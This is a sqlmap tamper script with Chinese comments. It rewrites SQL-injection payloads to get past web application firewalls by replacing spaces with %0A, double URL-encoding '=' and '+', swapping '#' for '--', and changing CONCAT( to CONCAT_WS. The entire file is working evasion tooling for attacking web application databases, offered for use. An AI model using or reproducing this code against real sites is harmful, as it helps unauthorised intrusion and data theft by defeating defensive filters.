#!/usr/bin/env python
# coding=utf8
import random
import string

from lib.core.enums import PRIORITY
from lib.core.compat import xrange

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
   retVal = ""    
   if payload:                               #此处的payload变量便是sqlmap原始的payload
      for i in xrange(len(payload)):
            if payload[i].isspace():            #判断当前字符是否是空格
               if payload[i-4:i]=='FROM':      #标记位于 FROM 后的空格
                  retVal += 'WSXEDCRFV'
               else:
                  retVal += "%0A"            #将普通位置的空格替换为 %0A
            elif payload[i]=='=':               #将等号替换为双重url编码的 %253d
               retVal += "%253d"
            elif payload[i]=='+':               #将payload中的加号再进行一次url编码，以免被解析为空格
               retVal += "%252b"
            elif payload[i]=='#':               #将 # 注释符替换为 -
               retVal+='--'
            else:
               retVal += payload[i]
               for i in xrange(len(retVal)):
                  if retVal[i:i+7]=='CONCAT(':        #将CONCAT 函数替换为 CONCAT_WS 函数
                     retVal=retVal[:i]+"CONCAT_WS(' ',"+retVal[i+7:]
                     break
                  else:
                     pass
      return retVal.replace('WSXEDCRFV','+')      #将标记位替换为 + ，请求时会自动编码 为%2b